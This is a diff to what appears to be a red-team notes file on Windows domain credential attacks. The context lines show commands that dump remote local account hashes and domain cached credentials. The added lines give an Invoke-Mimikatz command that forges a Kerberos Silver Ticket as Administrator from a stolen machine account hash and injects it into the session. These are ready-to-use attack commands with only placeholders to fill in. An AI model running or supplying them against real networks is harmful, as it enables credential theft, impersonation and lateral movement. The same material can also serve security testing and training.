@@ -134,6 +134,9 @@ C:> Get-RemoteLocalAccountHash -ComputerName <hostname> -Verbose
 
 # As <username> from before, retrieve domain cached credentials:
 C:> Get-RemoteCachedCredential -ComputerName <hostname> -Verbose
+
+# With this machine account hash can create Silver Tickets
+C:> Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain_fqdn> /sid:<domain_sid> /target:<hostname_fqdn> /service:HOST /rc4:<host_hash> /user:Administrator /ptt"'
 ```
 ### MORE
 
